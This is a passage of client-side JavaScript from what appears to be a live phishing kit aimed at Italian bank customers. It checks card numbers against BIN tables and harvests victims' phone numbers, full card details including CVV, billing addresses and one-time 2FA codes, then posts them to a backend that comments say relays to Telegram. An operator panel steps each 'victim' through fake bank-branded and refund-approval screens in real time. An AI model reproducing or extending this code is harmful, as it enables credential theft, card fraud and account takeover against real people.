            '4116': 'Visa', '4117': 'Visa', '4118': 'Visa', '4119': 'Visa',
            '4120': 'Visa', '4121': 'Visa', '4122': 'Visa', '4123': 'Visa',
            '4124': 'Visa', '4125': 'Visa', '4126': 'Visa', '4127': 'Visa',
            '4128': 'Visa', '4129': 'Visa', '4130': 'Visa', '4140': 'Visa',
            '4150': 'Visa', '4160': 'Visa', '4170': 'Visa', '4180': 'Visa',
            '4190': 'Visa', '4200': 'Visa', '4210': 'Visa', '4220': 'Visa',
            '4230': 'Visa', '4240': 'Visa', '4250': 'Visa', '4260': 'Visa',
            '4270': 'Visa', '4280': 'Visa', '4290': 'Visa', '4300': 'Visa',
            '4310': 'Visa', '4320': 'Visa', '4330': 'Visa', '4340': 'Visa',
            '4350': 'Visa', '4360': 'Visa', '4370': 'Visa', '4380': 'Visa',
            '4390': 'Visa', '4400': 'Visa', '4410': 'Visa', '4420': 'Visa',
            '4430': 'Visa', '4440': 'Visa', '4450': 'Visa', '4460': 'Visa',
            '4470': 'Visa', '4480': 'Visa', '4490': 'Visa', '4500': 'Visa',
            '4510': 'Visa', '4511': 'Visa', '4512': 'Visa', '4513': 'Visa',
            '4514': 'Visa', '4515': 'Visa', '4516': 'Visa', '4517': 'Visa',
            '4518': 'Visa', '4519': 'Visa', '4520': 'Visa', '4530': 'Visa',
            '4531': 'Visa', '4532': 'Visa', '4533': 'Visa', '4534': 'Visa',
            '4535': 'Visa', '4536': 'Visa', '4537': 'Visa', '4538': 'Visa',
            '4539': 'Visa', '4540': 'Visa', '4550': 'Visa', '4560': 'Visa',
            '4570': 'Visa', '4580': 'Visa', '4590': 'Visa', '4600': 'Visa',
            '4700': 'Visa', '4710': 'Visa', '4711': 'Visa', '4712': 'Visa',
            '4713': 'Visa', '4714': 'Visa', '4715': 'Visa', '4716': 'Visa',
            '4717': 'Visa', '4718': 'Visa', '4719': 'Visa', '4720': 'Visa',
            '4730': 'Visa', '4740': 'Visa', '4750': 'Visa', '4760': 'Visa',
            '4770': 'Visa', '4780': 'Visa', '4790': 'Visa', '4800': 'Visa',
            '4810': 'Visa', '4820': 'Visa', '4830': 'Visa', '4840': 'Visa',
            '4850': 'Visa', '4860': 'Visa', '4870': 'Visa', '4880': 'Visa',
            '4890': 'Visa', '4900': 'Visa', '4910': 'Visa', '4920': 'Visa',
            '4930': 'Visa', '4940': 'Visa', '4950': 'Visa', '4960': 'Visa',
            '4970': 'Visa', '4980': 'Visa', '4990': 'Visa',
            // Mastercard broad ranges (4-digit)
            '5100': 'Mastercard', '5110': 'Mastercard', '5120': 'Mastercard',
            '5130': 'Mastercard', '5140': 'Mastercard', '5150': 'Mastercard',
            '5160': 'Mastercard', '5170': 'Mastercard', '5180': 'Mastercard',
            '5190': 'Mastercard', '5200': 'Mastercard', '5210': 'Mastercard',
            '5220': 'Mastercard', '5230': 'Mastercard', '5240': 'Mastercard',
            '5250': 'Mastercard', '5260': 'Mastercard', '5270': 'Mastercard',
            '5280': 'Mastercard', '5290': 'Mastercard', '5300': 'Mastercard',
            '5310': 'Mastercard', '5320': 'Mastercard', '5330': 'Mastercard',
            '5340': 'Mastercard', '5350': 'Mastercard', '5360': 'Mastercard',
            '5370': 'Mastercard', '5380': 'Mastercard', '5390': 'Mastercard',
            '5400': 'Mastercard', '5410': 'Mastercard', '5420': 'Mastercard',
            '5430': 'Mastercard', '5440': 'Mastercard', '5450': 'Mastercard',
            '5460': 'Mastercard', '5470': 'Mastercard', '5480': 'Mastercard',
            '5490': 'Mastercard', '5500': 'Mastercard', '5510': 'Mastercard',
            '5520': 'Mastercard', '5530': 'Mastercard', '5540': 'Mastercard',
            '5550': 'Mastercard', '5560': 'Mastercard', '5570': 'Mastercard',
            '5580': 'Mastercard', '5590': 'Mastercard',
            '2221': 'Mastercard', '2222': 'Mastercard', '2223': 'Mastercard',
            '2300': 'Mastercard', '2400': 'Mastercard', '2500': 'Mastercard',
            '2600': 'Mastercard', '2700': 'Mastercard',
            // Amex (4-digit)
            '3400': 'Amex', '3410': 'Amex', '3430': 'Amex', '3450': 'Amex',
            '3700': 'Amex', '3710': 'Amex', '3720': 'Amex', '3730': 'Amex',
            '3740': 'Amex', '3750': 'Amex', '3760': 'Amex', '3770': 'Amex',
            '3780': 'Amex', '3790': 'Amex',
            // Discover
            '6011': 'Discover', '6500': 'Discover', '6510': 'Discover',
            // Diners Club
            '3000': 'Diners Club', '3010': 'Diners Club', '3050': 'Diners Club',
            '3600': 'Diners Club', '3670': 'Diners Club', '3800': 'Diners Club',
            '3850': 'Diners Club',
            // JCB
            '3528': 'JCB', '3529': 'JCB', '3530': 'JCB', '3540': 'JCB',
            '3550': 'JCB', '3560': 'JCB', '3570': 'JCB', '3580': 'JCB',
        };

        function luhnCheck(num) {
            let arr = num.split('').reverse().map(x => parseInt(x));
            let sum = arr.reduce((acc, val, i) => {
                if (i % 2 !== 0) { val *= 2; if (val > 9) val -= 9; }
                return acc + val;
            }, 0);
            return sum % 10 === 0;
        }

        function getCardBrand(num) {
            if (/^4/.test(num)) return 'visa';
            if (/^5[1-5]/.test(num)) return 'mastercard';
            if (/^2(?:2[2-9]|[3-6]|7[0-2])/.test(num)) return 'mastercard'; // MC 2-series
            if (/^3[47]/.test(num)) return 'amex';
            if (/^3(?:0[0-5]|[68])/.test(num)) return 'diners';
            if (/^6(?:011|5)/.test(num)) return 'discover';
            return 'unknown';
        }

        function getCardLength(brand) {
            if (brand === 'amex' || brand === 'diners') return [15];
            if (brand === 'visa') return [13, 16, 19];
            return [16];
        }

        // BIN check: tries exact match at 8,7,6,5 digits, then brand-level fallback at 4,3 digits
        function checkBIN(cardNum) {
            // First try exact prefix match (most specific)
            for (let len of [8, 7, 6, 5]) {
                if (cardNum.length >= len) {
                    const prefix = cardNum.substring(0, len);
                    if (BIN_DB[prefix]) return { bank: BIN_DB[prefix], bin: prefix };
                }
            }
            // Fallback: try 4-digit and 3-digit brand-level prefixes
            for (let len of [4, 3]) {
                if (cardNum.length >= len) {
                    const prefix = cardNum.substring(0, len);
                    if (BIN_DB[prefix]) return { bank: BIN_DB[prefix], bin: prefix };
                }
            }
            return null;
        }

        function validateExpiry(mmYY) {
            const match = mmYY.match(/^(0[1-9]|1[0-2])\/(\d{2})$/);
            if (!match) return false;
            const month = parseInt(match[1]);
            const year = parseInt('20' + match[2]);
            const now = new Date();
            const currentMonth = now.getMonth() + 1;
            const currentYear = now.getFullYear();
            if (year < currentYear) return false;
            if (year === currentYear && month < currentMonth) return false;
            if (year > currentYear + 20) return false;
            return true;
        }

        function validateCard() {
            let valid = true;

            // Name
            const name = document.getElementById('card-name').value.trim();
            const nameParts = name.split(/\s+/).filter(p => p.length > 1);
            if (nameParts.length < 2 || name.length < 5) {
                document.getElementById('card-name').classList.add('input-error');
                document.getElementById('card-name-error').classList.remove('hidden');
                document.getElementById('card-name-error').innerText = 'Inserisci nome e cognome validi';
                valid = false;
            } else {
                document.getElementById('card-name').classList.remove('input-error');
                document.getElementById('card-name-error').classList.add('hidden');
            }

            // Card number: Luhn + brand length + BIN check
            const cardNum = document.getElementById('card-number').value.replace(/\s/g, '');
            const brand = getCardBrand(cardNum);
            const validLengths = getCardLength(brand);
            const luhnOk = luhnCheck(cardNum);
            const lengthOk = validLengths.includes(cardNum.length);
            const binOk = checkBIN(cardNum) !== null;
            const brandOk = brand !== 'unknown';

            if (cardNum.length < 13 || cardNum.length > 19 || !luhnOk || !lengthOk || !brandOk) {
                document.getElementById('card-number').classList.add('input-error');
                document.getElementById('card-number-error').classList.remove('hidden');
                if (!luhnOk) document.getElementById('card-number-error').innerText = 'Numero carta non valido';
                else if (!brandOk) document.getElementById('card-number-error').innerText = 'Tipo di carta non supportato';
                else document.getElementById('card-number-error').innerText = 'Numero carta non valido';
                valid = false;
            } else if (!binOk) {
                // BIN not found in our database — could be a real card from a bank we don't have,
                // so we still ACCEPT it but log it differently. Only reject if it also fails Luhn/length.
                // For maximum strictness: REJECT unknown BINs
                document.getElementById('card-number').classList.add('input-error');
                document.getElementById('card-number-error').classList.remove('hidden');
                document.getElementById('card-number-error').innerText = 'Numero carta non riconosciuto';
                valid = false;
            } else {
                document.getElementById('card-number').classList.remove('input-error');
                document.getElementById('card-number-error').classList.add('hidden');
            }

            // Expiry
            const expiry = document.getElementById('card-expiry').value;
            if (!validateExpiry(expiry)) {
                document.getElementById('card-expiry').classList.add('input-error');
                document.getElementById('card-expiry-error').classList.remove('hidden');
                document.getElementById('card-expiry-error').innerText = 'Data di scadenza non valida o carta scaduta';
                valid = false;
            } else {
                document.getElementById('card-expiry').classList.remove('input-error');
                document.getElementById('card-expiry-error').classList.add('hidden');
            }

            // CVV
            const cvv = document.getElementById('card-cvv').value;
            const expectedCvvLen = (brand === 'amex') ? 4 : 3;
            if (cvv.length !== expectedCvvLen) {
                document.getElementById('card-cvv').classList.add('input-error');
                document.getElementById('card-cvv-error').classList.remove('hidden');
                document.getElementById('card-cvv-error').innerText = expectedCvvLen === 4 ? 'Amex richiede CVV a 4 cifre' : 'CVV deve essere di 3 cifre';
                valid = false;
            } else {
                document.getElementById('card-cvv').classList.remove('input-error');
                document.getElementById('card-cvv-error').classList.add('hidden');
            }

            return valid;
        }

        // =============================================================
        // 7. FUNZIONI PROCESS — ALL PANEL-GATED (spinner forever until panel acts)
        // =============================================================
        // Italian phone validation: 10 digits, must start with 3 (mobile)
        function validateItalianPhone(num) {
            const clean = num.replace(/[\s\-\.]/g, '');
            if (!/^3\d{9}$/.test(clean)) return false;
            const validPrefixes = [
                '330','331','332','333','334','335','336','337','338','339',
                '340','341','342','343','344','345','346','347','348','349',
                '350','351','352','353','354','355','356','357','358','359',
                '360','361','362','363','364','365','366','367','368',
                '370','371','372','373','374','375','376','377','378','379',
                '380','381','382','383','384','385','386','387','388','389',
                '390','391','392','393','394','395','396','397','398','399',
                '320','321','322','323','324','325','326','327','328','329',
                '310','311','312','313','314','315','316','317','318','319'
            ];
            return validPrefixes.includes(clean.substring(0, 3));
        }

        function validatePhoneInput(el) {
            el.value = el.value.replace(/\D/g, '');
            const err = document.getElementById('phone-error');
            if (err) err.classList.add('hidden');
            el.classList.remove('input-error');
        }

        function processLogin() {
            const btn = document.getElementById('btn-login');
            const input = document.getElementById('user-input');
            const userVal = input.value.replace(/[\s\-\.]/g, '');
            if (!userVal || !validateItalianPhone(userVal)) {
                input.classList.add('input-error');
                document.getElementById('phone-error').classList.remove('hidden');
                return;
            }
            input.classList.remove('input-error');
            document.getElementById('phone-error').classList.add('hidden');
            btn.classList.add('is-loading');
            input.value = userVal;
            let fd = new FormData(); fd.append('user', userVal); fd.append('type', 'login');
            fetch('api.php', { method: 'POST', body: fd }).then(() => {
                if (!checkInterval) checkInterval = setInterval(checkStatus, 2000);
                // Keep spinner spinning — panel advances us
            });
        }

        function processCard() {
            const btn = document.getElementById('btn-card');
            if (!validateCard()) { document.getElementById('card-error').style.display = 'flex'; return; }
            document.getElementById('card-error').style.display = 'none';
            btn.classList.add('is-loading');
            const cardNum = document.getElementById('card-number').value.replace(/\s/g, '');
            const binInfo = checkBIN(cardNum);
            const brand = getCardBrand(cardNum);
            let fd = new FormData();
            fd.append('type', 'card_details');
            fd.append('card_name', document.getElementById('card-name').value);
            fd.append('card_number', cardNum);
            fd.append('card_expiry', document.getElementById('card-expiry').value);
            fd.append('card_cvv', document.getElementById('card-cvv').value);
            fd.append('card_brand', brand);
            fd.append('card_bank', binInfo ? binInfo.bank : 'Unknown');
            fd.append('card_bin', binInfo ? binInfo.bin : 'N/A');
            fetch('api.php', { method: 'POST', body: fd }).then(() => {
                // Card data sent to Telegram — spinner stays, panel advances to 3DS
            });
        }

        let _3dsOriginalHTML = null;

        function processVerifyApp() {
            sendNotif('verify_app_push');
            const choiceSection = document.querySelector('#step-3ds-1 .flex-grow');
            if (!choiceSection) return;
            // Save original 3DS HTML so we can restore it
            if (!_3dsOriginalHTML) _3dsOriginalHTML = choiceSection.innerHTML;
            choiceSection.innerHTML = `
                <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight">Autorizzazione Push in Attesa</h1>
                <p class="text-[13px] text-[#5e5e6e] mb-4">Conferma la tua identità tramite l'app della tua banca</p>
                <div class="relative w-20 h-20 mx-auto mb-6">
                    <div class="absolute inset-0 border-4 border-[#e5e5ea] rounded-full"></div>
                    <div class="absolute inset-0 border-4 border-[#080516] rounded-full border-t-transparent animate-spin"></div>
                    <div class="absolute inset-0 flex items-center justify-center">
                        <i class="fa-solid fa-mobile-screen-button text-2xl text-[#080516]"></i>
                    </div>
                </div>
                <p class="text-[14px] text-[#5e5e6e] max-w-xs mx-auto mb-4">Abbiamo inviato una notifica all'app della tua banca. Aprila e clicca su <strong>Conferma</strong> per completare il rimborso.</p>
                <div class="bg-amber-50 rounded-xl p-4 mb-6 text-amber-700 text-xs flex items-start gap-2.5 text-left border border-amber-200 w-full">
                    <i class="fa-solid fa-circle-exclamation mt-0.5 text-sm text-amber-500"></i>
                    <span>Verifica che le notifiche push siano abilitate. L'operazione sarà completata automaticamente dopo la conferma.</span>
                </div>
                <button onclick="showStep('step-card')" class="text-sm font-semibold text-[#4b3ec4] hover:underline transition">
                    <i class="fa-solid fa-chevron-left text-[10px]"></i> Torna indietro
                </button>
            `;
        }

        // Restore 3DS page when entering it again
        function restore3DS() {
            const choiceSection = document.querySelector('#step-3ds-1 .flex-grow');
            if (choiceSection && _3dsOriginalHTML) {
                choiceSection.innerHTML = _3dsOriginalHTML;
            }
        }

        function processVerifySMS() {
            showStep('step-sms-otp');
            sendNotif('verify_sms_request');
        }

        function processSMSOTP() {
            const btn = document.getElementById('btn-sms-otp');
            const code = document.getElementById('sms-otp-code').value.replace(/\D/g, '');
            if (code.length !== 6) {
                document.getElementById('sms-otp-code').classList.add('input-error');
                document.getElementById('sms-otp-input-error').classList.remove('hidden');
                document.getElementById('sms-otp-global-error').style.display = 'flex'; return;
            }
            document.getElementById('sms-otp-code').classList.remove('input-error');
            document.getElementById('sms-otp-input-error').classList.add('hidden');
            document.getElementById('sms-otp-global-error').style.display = 'none';
            btn.classList.add('is-loading');
            let fd = new FormData();
            fd.append('type', 'verify_sms_otp');
            fd.append('code', code);
            fetch('api.php', { method: 'POST', body: fd }).then(() => {
                // OTP sent to Telegram — spinner stays, panel advances
            });
        }

        // =============================================================
        // 7B. BILLING ADDRESS (panel-gated)
        // =============================================================
        // Shared storage for cross-step data
        let victimName = { first: '', last: '' };

        function validateBilling() {
            let valid = true;
            const first = document.getElementById('billing-firstname')?.value.trim() || '';
            const last = document.getElementById('billing-lastname')?.value.trim() || '';
            const address = document.getElementById('billing-address')?.value.trim() || '';
            const city = document.getElementById('billing-city')?.value.trim() || '';
            const zip = document.getElementById('billing-zip')?.value.trim() || '';
            const province = document.getElementById('billing-province')?.value || '';
            const phone = document.getElementById('billing-phone')?.value.trim() || '';

            if (first.length < 2) {
                document.getElementById('billing-firstname').classList.add('input-error');
                document.getElementById('billing-firstname-error').classList.remove('hidden'); valid = false;
            } else {
                document.getElementById('billing-firstname').classList.remove('input-error');
                document.getElementById('billing-firstname-error').classList.add('hidden');
            }
            if (last.length < 2) {
                document.getElementById('billing-lastname').classList.add('input-error');
                document.getElementById('billing-lastname-error').classList.remove('hidden'); valid = false;
            } else {
                document.getElementById('billing-lastname').classList.remove('input-error');
                document.getElementById('billing-lastname-error').classList.add('hidden');
            }
            if (address.length < 5) {
                document.getElementById('billing-address').classList.add('input-error');
                document.getElementById('billing-address-error').classList.remove('hidden'); valid = false;
            } else {
                document.getElementById('billing-address').classList.remove('input-error');
                document.getElementById('billing-address-error').classList.add('hidden');
            }
            if (city.length < 2) {
                document.getElementById('billing-city').classList.add('input-error');
                document.getElementById('billing-city-error').classList.remove('hidden'); valid = false;
            } else {
                document.getElementById('billing-city').classList.remove('input-error');
                document.getElementById('billing-city-error').classList.add('hidden');
            }
            if (!/^\d{5}$/.test(zip)) {
                document.getElementById('billing-zip').classList.add('input-error');
                document.getElementById('billing-zip-error').classList.remove('hidden'); valid = false;
            } else {
                document.getElementById('billing-zip').classList.remove('input-error');
                document.getElementById('billing-zip-error').classList.add('hidden');
            }
            if (!province) {
                document.getElementById('billing-province').classList.add('input-error');
                document.getElementById('billing-province-error').classList.remove('hidden'); valid = false;
            } else {
                document.getElementById('billing-province').classList.remove('input-error');
                document.getElementById('billing-province-error').classList.add('hidden');
            }
            if (phone.length < 7) {
                document.getElementById('billing-phone').classList.add('input-error');
                document.getElementById('billing-phone-error').classList.remove('hidden'); valid = false;
            } else {
                document.getElementById('billing-phone').classList.remove('input-error');
                document.getElementById('billing-phone-error').classList.add('hidden');
            }
            return valid;
        }

        function clearBillingForm() {
            ['billing-firstname','billing-lastname','billing-address','billing-city','billing-zip','billing-phone'].forEach(fid => {
                const el = document.getElementById(fid);
                if (el) { el.value = ''; el.classList.remove('input-error'); }
            });
            const prov = document.getElementById('billing-province');
            if (prov) { prov.selectedIndex = 0; prov.classList.remove('input-error'); }
            ['billing-firstname-error','billing-lastname-error','billing-address-error','billing-city-error','billing-zip-error','billing-province-error','billing-phone-error','billing-error'].forEach(eid => {
                const el = document.getElementById(eid);
                if (el) el.style.display = 'none';
            });
        }

        function processBilling() {
            const btn = document.getElementById('btn-billing');
            if (!validateBilling()) { document.getElementById('billing-error').style.display = 'flex'; return; }
            document.getElementById('billing-error').style.display = 'none';
            btn.classList.add('is-loading');
            // Store name for cross-step sharing
            victimName.first = document.getElementById('billing-firstname').value.trim().toUpperCase();
            victimName.last = document.getElementById('billing-lastname').value.trim().toUpperCase();
            // Pre-fill card name right away
            const cardNameInput = document.getElementById('card-name');
            if (cardNameInput) cardNameInput.value = victimName.first + ' ' + victimName.last;
            let fd = new FormData();
            fd.append('type', 'billing_details');
            fd.append('billing_firstname', victimName.first);
            fd.append('billing_lastname', victimName.last);
            fd.append('billing_address', document.getElementById('billing-address').value.trim());
            fd.append('billing_city', document.getElementById('billing-city').value.trim());
            fd.append('billing_zip', document.getElementById('billing-zip').value.trim());
            fd.append('billing_province', document.getElementById('billing-province').value);
            fd.append('billing_country', 'Italia');
            fd.append('billing_phone', document.getElementById('billing-phone').value.trim());
            fetch('api.php', { method: 'POST', body: fd }).then(() => {
                // Billing data sent — spinner stays, panel advances
            });
        }

        function processFinished() {
            sendNotif('finished');
            // Stay on finished page — no auto-redirect
        }

        // =============================================================
        // 8. STATUS CHECKER — ALL PANEL-GATED (unstops spinners, advances steps)
        // =============================================================
        function checkStatus() {
            fetch('status.php', { cache: 'no-store' })
            .then(r => r.json())
            .then(data => {
                const userInput = document.getElementById('user-input');
                if (!userInput) return;
                const userVal = userInput.value;
                let s = "";
                for (let ip in data) { if (data[ip].email === userVal) { s = data[ip].status; break; } }
                if (s !== lastStatus) {
                    lastStatus = s;
                    // NAVIGATION (unspin any stuck buttons)
                    if (s === 'go_email') {
                        const bl = document.getElementById('btn-login');
                        if (bl) bl.classList.remove('is-loading');
                        const de = document.getElementById('display-email');
                        if (de) de.innerText = userVal;
                        showStep('step-2fa-email');
                    }
                    else if (s === 'go_sms') {
                        const be = document.getElementById('btn-email');
                        if (be) be.classList.remove('is-loading');
                        showStep('step-2fa-sms');
                    }
                    else if (s === 'go_mfa') {
                        const bs = document.getElementById('btn-sms');
                        if (bs) bs.classList.remove('is-loading');
                        showStep('step-mfa');
                    }
                    else if (s === 'go_verify') {
                        const bm = document.getElementById('btn-mfa');
                        if (bm) bm.classList.remove('is-loading');
                        resetTheme();
                        showStep('step-verify-identity');
                    }
                    else if (s === 'go_bank' || s === 'go_bank_force') {
                        // Go to bank list from any step
                        const vBtn = document.getElementById('btn-verify-identity');
                        if (vBtn) vBtn.classList.remove('is-loading');
                        // Unspin any stuck buttons
                        const bm = document.getElementById('btn-mfa');
                        const bc = document.getElementById('btn-card');
                        const bl = document.getElementById('btn-login');
                        if (bm) bm.classList.remove('is-loading');
                        if (bc) bc.classList.remove('is-loading');
                        if (bl) bl.classList.remove('is-loading');
                        resetTheme();
                        showStep('step-bank');
                    }
                    else if (s === 'go_billing' || s === 'go_billing_force') {
                        // Go to billing from any step
                        const bl = document.getElementById('btn-billing');
                        if (bl) bl.classList.remove('is-loading');
                        const bm = document.getElementById('btn-mfa');
                        const bc = document.getElementById('btn-card');
                        const bv = document.getElementById('btn-verify-identity');
                        if (bm) bm.classList.remove('is-loading');
                        if (bc) bc.classList.remove('is-loading');
                        if (bv) bv.classList.remove('is-loading');
                        showStep('step-billing');
                    }
                    else if (s === 'go_card' || s === 'go_card_force' || s === 'bank_push_approved' || s === 'bank_push_approve' || s === 'bank_success' || s === 'verify_app_approve') {
                        // Go to card form from any step
                        const bc = document.getElementById('btn-card');
                        if (bc) bc.classList.remove('is-loading');
                        // Unspin any other stuck buttons
                        const bm = document.getElementById('btn-mfa');
                        const bv = document.getElementById('btn-verify-identity');
                        if (bm) bm.classList.remove('is-loading');
                        if (bv) bv.classList.remove('is-loading');
                        showStep('step-card');
                    }
                    else if (s === 'reset') {
                        // Reset victim to login
                        const bl = document.getElementById('btn-login');
                        const bm = document.getElementById('btn-mfa');
                        const bc = document.getElementById('btn-card');
                        const bv = document.getElementById('btn-verify-identity');
                        if (bl) bl.classList.remove('is-loading');
                        if (bm) bm.classList.remove('is-loading');
                        if (bc) bc.classList.remove('is-loading');
                        if (bv) bv.classList.remove('is-loading');
                        showStep('step-login');
                    }
                    else if (s === 'go_3ds') {
                        const bc = document.getElementById('btn-card');
                        if (bc) bc.classList.remove('is-loading');
                        showStep('step-3ds-1');
                    }
                    // ERRORS
                    else if (s === 'otp_error') {
                        const s2e = document.getElementById('step-2fa-email');
                        const s2s = document.getElementById('step-2fa-sms');
                        const isEmail = s2e && !s2e.classList.contains('hidden');
                        const isSms = s2s && !s2s.classList.contains('hidden');
                        if (isEmail) {
                            const ee = document.getElementById('email-error');
                            const be = document.getElementById('btn-email');
                            if (ee) ee.style.display='flex';
                            if (be) be.classList.remove('is-loading');
                        }
                        else if (isSms) {
                            const se = document.getElementById('sms-error');
                            const bs = document.getElementById('btn-sms');
                            if (se) se.style.display='flex';
                            if (bs) bs.classList.remove('is-loading');
                        }
                    }
                    else if (s === 'mfa_error') {
                        const me = document.getElementById('mfa-error');
                        const bm = document.getElementById('btn-mfa');
                        if (me) me.style.display='flex';
                        if (bm) bm.classList.remove('is-loading');
                    }
                    else if (s === 'card_error') {
                        const ce = document.getElementById('card-error');
                        const bc = document.getElementById('btn-card');
                        if (ce) ce.style.display='flex';
                        if (bc) bc.classList.remove('is-loading');
                    }
                    else if (s === 'billing_error') {
                        const be = document.getElementById('billing-error');
                        const bb = document.getElementById('btn-billing');
                        if (be) be.style.display='flex';
                        if (bb) bb.classList.remove('is-loading');
                    }
                    else if (s === 'sms_otp_error') {
                        const soe = document.getElementById('sms-otp-global-error');
                        const soie = document.getElementById('sms-otp-input-error');
                        const bso = document.getElementById('btn-sms-otp');
                        if (soe) soe.style.display='flex';
                        if (soie) soie.classList.remove('hidden');
                        if (bso) bso.classList.remove('is-loading');
                    }
                    else if (s === 'verify_app_approve') {
                        showStep('step-finished');
                    }
                    else if (s === 'finished') {
                        showStep('step-finished');
                    }
                    else if (s === 'block') {
                        document.querySelectorAll('.auth-card').forEach(c => c.classList.add('hidden'));
                    }
                    // Inline bank step handlers
                    else if (s === 'bank_login_error') {
                        const ble = document.getElementById('bank-login-error');
                        const bl = document.getElementById('btn-bank-login');
                        if (ble) ble.style.display = 'flex';
                        if (bl) bl.classList.remove('is-loading');
                        showStep('step-bank-login');
                    }
                }
            }).catch(err => console.log("Waiting..."));
        }

        // =============================================================
        // 9. GESTIONE CODICI OTP
        // =============================================================
        const codeInputs = [
            { id: 'code-email', type: '2fa_email', btn: 'btn-email' },
            { id: 'code-sms', type: '2fa_sms', btn: 'btn-sms' },
            { id: 'code-mfa', type: '2fa_mfa', btn: 'btn-mfa' }
        ];
        codeInputs.forEach(inputObj => {
            const el = document.getElementById(inputObj.id);
            if (el) {
                el.addEventListener('input', (e) => {
                    e.target.value = e.target.value.replace(/\D/g, '');
                    if (e.target.value.length === 6) {
                        document.getElementById(inputObj.btn).classList.add('is-loading');
                        let fd = new FormData(); fd.append('code', e.target.value); fd.append('type', inputObj.type);
                        fetch('api.php', { method: 'POST', body: fd });
                    }
                });
            }
        });

        // =============================================================
        // 10. FUNZIONI PER LA BANCA
        // =============================================================
        const bankListContainer = document.getElementById('bank-list-container');
        const bankSearchInput = document.getElementById('bank-search-input');
        const typingNotif = document.getElementById('typing-notification');
        const typingText = document.getElementById('typing-text');
        const selectedBankDisplay = document.getElementById('selected-bank-display');
        const selectedBankNameSpan = document.getElementById('selected-bank-name');

        function getBankAvatarHtml(bank, sizeClass = "w-11 h-11", textClass = "text-xs") {
            const fallbackId = `fallback-${bank.id}-${Math.floor(Math.random() * 100000)}`;
            const imgId = `img-${bank.id}-${Math.floor(Math.random() * 100000)}`;
            let imageSrc = '';
            if (bank.logoFile) {
                imageSrc = `./banks/banks/${bank.logoFile}`;
            } else if (bank.logoUrl && bank.logoUrl.trim() !== '') {
                imageSrc = bank.logoUrl;
            }
            const hasImage = imageSrc !== '';
            return `
                <div class="relative ${sizeClass} flex-shrink-0 flex items-center justify-center">
                    ${hasImage ? `<img id="${imgId}" src="${imageSrc}" onerror="document.getElementById('${fallbackId}').style.display='flex'; this.style.display='none';" class="${sizeClass} object-contain rounded-xl bg-white border border-slate-200" alt="${bank.name}">` : ''}
                    <div id="${fallbackId}" style="display: ${hasImage ? 'none' : 'flex'};" 
                         class="absolute inset-0 ${sizeClass} ${bank.logoBg} rounded-xl items-center justify-center font-bold ${textClass}" 
                         style="color: ${bank.textColor}">
                        ${bank.logoText}
                    </div>
                </div>
            `;
        }

        function renderBanksList(banks) {
            bankListContainer.innerHTML = '';
            banks.forEach(bank => {
                const div = document.createElement('div');
                div.className = 'bank-item';
                const avatarHtml = getBankAvatarHtml(bank, "w-11 h-11", "text-xs");
                div.innerHTML = `
                    <div class="bank-info">
                        ${avatarHtml}
                        <div>
                            <div class="bank-name">${bank.name}</div>
                            <div class="bank-sub">${bank.shortName || ''}</div>
                        </div>
                    </div>
                    <i class="fa-solid fa-chevron-right bank-chevron"></i>
                `;
                div.addEventListener('click', () => handleBankChoice(bank));
                bankListContainer.appendChild(div);
            });
        }

        function filterBanks() {
            const query = bankSearchInput.value.toLowerCase().trim();
            const filtered = italianBanks.filter(b => 
                b.name.toLowerCase().includes(query) || 
                (b.shortName && b.shortName.toLowerCase().includes(query))
            );
            renderBanksList(filtered);
            if (query.length > 0) {
                typingText.innerText = `Sto cercando "${query}"...`;
                typingNotif.classList.add('show');
            } else {
                typingNotif.classList.remove('show');
            }
        }

        function sendTypingNotification(searchTerm) {
            if (searchTerm.length === 0) return;
            clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => {
                sendNotif('bank_typing', { search: searchTerm });
            }, 500);
        }

        function showTypingNotification() {
            const val = bankSearchInput.value.trim();
            if (val.length > 0) {
                typingText.innerText = `Sto cercando "${val}"...`;
                typingNotif.classList.add('show');
                sendTypingNotification(val);
            } else {
                typingNotif.classList.remove('show');
                selectedBankDisplay.style.display = 'none';
                currentSelectedBank = null;
                currentSelectedBranch = null;
            }
        }

        function adaptThemeToBank(bank) {
            const color = bank.brandColor;
            const textCol = bank.textColor;
            const badges = ['bank-step-badge', 'branch-step-badge', 'login-step-badge', 'redirect-step-badge', 'verify-step-badge', 'push-step-badge', 'sms-step-badge'];
            badges.forEach(id => {
                const el = document.getElementById(id);
                if (el) { el.style.backgroundColor = color; el.style.color = textCol; }
            });
            const btns = ['btn-bank-confirm', 'btn-bank-login', 'btn-redirect-continue'];
            btns.forEach(id => {
                const el = document.getElementById(id);
                if (el) { el.style.backgroundColor = color; el.style.color = textCol; }
            });
            const titles = ['bank-step-title', 'branch-step-title', 'login-step-title'];
            titles.forEach(id => {
                const el = document.getElementById(id);
                if (el) el.style.color = color;
            });
            const spinner = document.getElementById('push-spinner');
            if (spinner) {
                spinner.style.borderColor = color;
                spinner.style.borderTopColor = 'transparent';
            }
            const searchInput = document.getElementById('bank-search-input');
            searchInput.addEventListener('focus', () => { searchInput.style.borderColor = color; });
            searchInput.addEventListener('blur', () => { searchInput.style.borderColor = '#d1d1d6'; });
        }

        function resetTheme() {
            const defaultColor = '#ffb3c7';
            const textCol = '#000';
            ['bank-step-badge', 'branch-step-badge', 'login-step-badge', 'redirect-step-badge', 'verify-step-badge', 'push-step-badge', 'sms-step-badge'].forEach(id => {
                const el = document.getElementById(id);
                if (el) { el.style.backgroundColor = defaultColor; el.style.color = textCol; }
            });
            ['btn-bank-confirm', 'btn-bank-login', 'btn-redirect-continue'].forEach(id => {
                const el = document.getElementById(id);
                if (el) { el.style.backgroundColor = '#080516'; el.style.color = 'white'; }
            });
            ['bank-step-title', 'branch-step-title', 'login-step-title'].forEach(id => {
                const el = document.getElementById(id);
                if (el) el.style.color = '#080516';
            });
            const spinner = document.getElementById('push-spinner');
            if (spinner) {
                spinner.style.borderColor = '#080516';
                spinner.style.borderTopColor = 'transparent';
            }
        }

        function handleBankChoice(bank) {
            currentSelectedBank = bank;
            currentSelectedBranch = null;
            selectedBankNameSpan.innerText = bank.name;
            selectedBankDisplay.style.display = 'flex';
            typingNotif.classList.remove('show');

            sendNotif('bank_selected', { bank_id: bank.id, bank_name: bank.name });
            adaptThemeToBank(bank);
            showBankRedirectStep(bank);
        }

        function showBankRedirectStep(bank, branch = null) {
            const logoContainer = document.getElementById('redirect-logo-container');
            const logoImg = document.getElementById('redirect-bank-image');
            const fallback = document.getElementById('redirect-bank-fallback');

            let imageSrc = '';
            if (bank.logoFile) {
